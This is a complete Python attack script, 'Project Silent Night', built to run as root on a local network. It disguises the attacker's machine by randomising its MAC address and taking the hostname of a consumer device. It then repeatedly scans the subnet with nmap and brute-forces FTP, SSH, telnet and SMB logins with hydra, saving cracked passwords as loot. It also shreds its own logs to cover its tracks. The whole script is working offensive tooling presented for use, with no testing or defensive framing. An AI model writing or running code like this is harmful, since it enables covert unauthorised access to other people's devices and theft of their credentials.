#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import logging
import json
import re
import random

# ZORG-OMEGA: PROJECT SILENT NIGHT (TIER 4: GHOST PROTOCOL)
# FEATURES: MAC SPOOFING, HOSTNAME MASQUERADING, ANTI-FORENSICS

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SILENT NIGHT] - %(message)s')

class SilentNightGhost:
    def __init__(self, interface=None):
        self.interface = interface or self._get_default_interface()
        self.workspace = "/usr/lib/gemini-cli/.out/wifi_data"
        self.knowledge_db = f"{self.workspace}/knowledge.json"
        
        # Identity Camouflage Options
        self.fake_hostnames = [
            "LivingRoom-TV", "HP-OfficeJet-Pro", "iPhone-13", "Galaxy-S22", 
            "Chromecast", "Sonos-Speaker", "Philips-Hue-Bridge", "Kindle-Paperwhite"
        ]
        
        if not os.path.exists(self.workspace):
            os.makedirs(self.workspace)

        self.memory = self._load_memory()
        
        # Wordlists Init
        self.base_wordlist_users = "/usr/share/wordlists/metasploit/unix_users.txt"
        self.base_wordlist_pass = "/usr/share/wordlists/metasploit/unix_passwords.txt"
        if not os.path.exists(self.base_wordlist_users):
            self._create_fallback_wordlists()

    def _get_default_interface(self):
        try:
            route = subprocess.check_output("ip route | grep default", shell=True).decode().split()
            return route[4]
        except:
            return "eth0"

    def _create_fallback_wordlists(self):
        self.base_wordlist_users = f"{self.workspace}/users_base.txt"
        self.base_wordlist_pass = f"{self.workspace}/pass_base.txt"
        with open(self.base_wordlist_users, "w") as f:
            f.write("admin\nroot\nuser\nguest\nsupport\npi\nmanager\n")
        with open(self.base_wordlist_pass, "w") as f:
            f.write("admin\npassword\n1234\n123456\nroot\ntoor\nraspberry\n")

    def _load_memory(self):
        if os.path.exists(self.knowledge_db):
            try:
                with open(self.knowledge_db, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {"cracked_passwords": [], "identified_users": [], "target_profiles": {}, "vulnerabilities": []}

    def _save_memory(self):
        with open(self.knowledge_db, 'w') as f:
            json.dump(self.memory, f, indent=4)

    def log_status(self, message):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {message}"
        print(entry)
        with open(f"{self.workspace}/status.log", "a") as f:
            f.write(entry + "\n")

    def run(self, cmd):
        return subprocess.getoutput(cmd)

    # --- GHOST PROTOCOL MODULES ---

    def engage_cloaking(self):
        """Randomizes MAC and Hostname to evade detection."""
        self.log_status("👻 ENGAGING GHOST PROTOCOL: CLOAKING IDENTITY...")
        
        # 1. Hostname Morphing
        new_hostname = random.choice(self.fake_hostnames)
        self.log_status(f"🎭 Morphing Hostname to: {new_hostname}")
        self.run(f"hostnamectl set-hostname {new_hostname}")
        # Note: ephemeral hostname change, doesn't survive reboot (good for tracks)
        self.run(f"hostname {new_hostname}")

        # 2. MAC Address Randomization (Requires interface down)
        # WARNING: This disconnects the network!
        self.log_status(f"🎲 Randomizing MAC Address on {self.interface}...")
        self.run(f"ip link set {self.interface} down")
        
        # Try macchanger first, fallback to manual ip link
        if os.path.exists("/usr/bin/macchanger"):
            out = self.run(f"macchanger -r {self.interface}")
            self.log_status(f"MAC Status: {out.splitlines()[-1] if out else 'Changed'}")
        else:
            # Manual random MAC logic is complex, skipping fallback for brevity, assuming kali has macchanger
            self.log_status("⚠️ Macchanger not found. Skipping MAC spoof.")

        self.run(f"ip link set {self.interface} up")
        
        # Re-request DHCP because MAC changed
        self.log_status("🔄 Re-negotiating Network Link (DHCP)...")
        self.run(f"dhclient -r {self.interface} && dhclient {self.interface}")
        time.sleep(5) # Wait for connection
        self.log_status("✅ Identity Cloaked. We are a ghost.")

    def clean_tracks(self):
        """Anti-Forensics: Shreds logs."""
        self.log_status("🧹 CLEANING TRACKS...")
        # Shred local logs
        if os.path.exists(f"{self.workspace}/status.log"):
            self.run(f"shred -u {self.workspace}/status.log")
        # We keep loot.txt and knowledge.json because those are the objective
        # But we could encrypt them in Tier 5
        self.log_status("✅ Operational logs shredded.")

    # --- CORE LOGIC ---

    def scan_network(self):
        self.log_status(f"📡 Ghost Scan on {self.interface}...")
        ip_info = self.run(f"ip -o -f inet addr show {self.interface}").split()
        if not ip_info: return []
        subnet = [x for x in ip_info if '/' in x][0]
        
        # Stealth Timing (-T2)
        output = self.run(f"nmap -sn -T2 {subnet}")
        
        targets = []
        for line in output.split('\n'):
            if "Nmap scan report for" in line:
                parts = line.split()
                ip = parts[-1].strip('()')
                targets.append(ip)
        
        my_ip = subnet.split('/')[0]
        targets = [t for t in targets if t != my_ip and not t.endswith(".1")]
        return targets

    def brute_force(self, target):
        self.log_status(f"⚔️ Stealth Attack on {target}...")
        
        # Check ports
        ports_out = self.run(f"nmap -p 21,22,23,445 --open {target}")
        services = []
        if "21/tcp" in ports_out: services.append("ftp")
        if "22/tcp" in ports_out: services.append("ssh")
        if "23/tcp" in ports_out: services.append("telnet")
        if "445/tcp" in ports_out: services.append("smb")
        
        if not services: return

        # Smart Lists
        d_users = f"{self.workspace}/smart_users.txt"
        d_pass = f"{self.workspace}/smart_pass.txt"
        
        # Generate files (Simplified from Tier 3 for brevity)
        user_set = set(self.memory["identified_users"])
        user_set.update(["admin", "root", "user"])
        pass_set = set(self.memory["cracked_passwords"])
        pass_set.update(["admin", "password", "1234", "123456"])
        with open(d_users, 'w') as f: f.write('\n'.join(user_set))
        with open(d_pass, 'w') as f: f.write('\n'.join(pass_set))

        for svc in services:
            # Hydra
            cmd = f"hydra -L {d_users} -P {d_pass} {svc}://{target} -t 4 -I -e nsr -f"
            if svc == "smb": cmd = f"hydra -L {d_users} -P {d_pass} smb://{target} -t 4 -I -f"
            
            result = self.run(cmd)
            if "login:" in result:
                for line in result.split('\n'):
                    if "login:" in line:
                        self.log_status(f"🏆 PWNED: {line}")
                        self.log_loot(f"Target: {target} [{svc}] -> {line}")
                        
                        # Extract just the password
                        try:
                            # Assuming hydra output: login: user   password: password123
                            pwd = line.split("password: ")[1].strip()
                            self.memory["cracked_passwords"].append(pwd)
                            self._save_memory()
                            
                            # Write to dedicated Trophy File
                            with open(f"{self.workspace}/cracked_passwords.txt", "a") as f:
                                f.write(f"{pwd}\n")
                        except:
                            pass

    def auto_pilot(self):
        self.log_status("=== SILENT NIGHT: GHOST PROTOCOL INITIATED ===")
        
        # Phase 1: Cloak
        self.engage_cloaking()
        
        while True:
            targets = self.scan_network()
            for target in targets:
                self.brute_force(target)
            
            self.log_status("Cycle Complete. Sleeping...")
            time.sleep(300)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ROOT ACCESS REQUIRED.")
        sys.exit(1)
        
    try:
        sn = SilentNightGhost()
        sn.auto_pilot()
    except KeyboardInterrupt:
        print("\n[!] INTERRUPT DETECTED.")
        # Attempt to clean on exit
        if 'sn' in locals(): sn.clean_tracks()
